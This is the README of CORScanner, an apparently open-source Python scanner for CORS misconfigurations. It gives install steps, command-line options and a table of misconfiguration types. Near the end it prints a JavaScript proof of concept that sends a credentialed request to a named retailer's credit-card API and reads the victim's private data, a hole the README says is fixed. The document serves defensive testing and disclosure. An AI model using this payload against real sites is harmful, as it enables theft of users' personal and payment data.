## About CORScanner 

CORScanner is a python tool designed to discover CORS misconfigurations vulnerabilities of websites. It helps website administrators and penetration testers to check whether the domains/urls they are targeting have insecure CORS policies. 

The correct configuration of CORS policy is critical to website security, but CORS configurations have many error-prone corner cases.  Web developers who are not aware of these corner cases are likely to make mistakes. Thus, we summarize different common types of CORS misconfigurations and integrate them into this tool,  to help developers/security-practioners quickly locate and detect such security issues.

## Installation

- Download this tool
```
git clone https://github.com/chenjj/CORScanner.git
```

- Install dependencies
```
sudo pip install -r requirements.txt
```

CORScanner depends on the `requests`, `gevent`, `tld`, `colorama` and `argparse` python modules.

## Recommended Python Version:

* The recommended version for Python 2 is **2.7.x**

## Usage

Short Form    | Long Form     | Description
------------- | ------------- |-------------
-u            | --url         | URL/domain to check it's CORS policy
-d            | --headers     | Add headers to the request
-i            | --input       | URL/domain list file to check their CORS policy
-t            | --threads     | Number of threads to use for CORS scan
-o            | --output      | Save the results to text file
-v            | --verbose     | Enable the verbose mode and display results in realtime
-h            | --help        | show the help message and exit

### Examples

* To check CORS misconfigurations of specific domain:

``python cors_scan.py -u example.com``

* To check CORS misconfigurations of specific URL:

``python cors_scan.py -u http://example.com/restapi``

* To check CORS misconfiguration with specific headers:

``python cors_scan.py -u example.com -d "Cookie: test"``

* To check CORS misconfigurations of multiple domains/URLs:

``python cors_scan.py -i top_100_domains.txt -t 100``

* To list all the basic options and switches use -h switch:

```python cors_scan.py -h```

## Misconfiguration types

Misconfiguration type    | Description
------------------------ | --------------------------
Reflect_any_origin       | Blindly reflect the Origin header value in `Access-Control-Allow-Origin headers` in responses
Prefix_match             | `wwww.example.com` trusts `example.com.evil.com`
Suffix_match             | `wwww.example.com` trusts `evilexample.com`
Not_escape_dot           | `wwww.example.com` trusts `wwwaexample.com`
Substring match          | `wwww.example.com` trusts `example.co`
Trust_null               | `wwww.example.com` trusts `null`, which can be forged by iframe sandbox scripts
HTTPS_trust_HTTP         | Risky trust dependency, a MITM attacker may steal HTTPS site secrets
Trust_any_subdomain      | Risky trust dependency, a subdomain XSS may steal its secrets

## Exploitation examples
Here is an example about how to exploit "Reflect_any_origin" misconfiguration on Walmart.com. Note that the vulnerability has been fixed.

Walmart.com video on Youtube:

[![Walmart_CORS_misconfiguration_exploitation](https://github.com/chenjj/CORScanner/raw/master/images/walmart.png)](http://www.youtube.com/watch?v=3abaevsSHXY)

Here is the exploitation code:
```javascript
<script>
    // Send a cross origin request to target website server, and read victim's private data
    var req = new XMLHttpRequest();
    req.open('GET',"https://www.walmart.com/account/electrode/account/api/customer/:CID/credit-card",true);
    req.onload = stealData;
    req.withCredentials = true;
    req.send();

    function stealData(){
        //read the response, and extract the data
        var data= JSON.stringify(JSON.parse(this.responseText),null,2);

        //display it on the page. A real attacker can send the data to his server.
        output(data);
    }

    function output(inp) {
        document.body.appendChild(document.createElement('pre')).innerHTML = inp;
    }
</script>
```

If you have understood how the demo works, you can read Section 5 and Section 6 of the [CORS paper](https://www.jianjunchen.com/publication/an-empirical-study-of-cors/) and know how to exploit other misconfigurations.
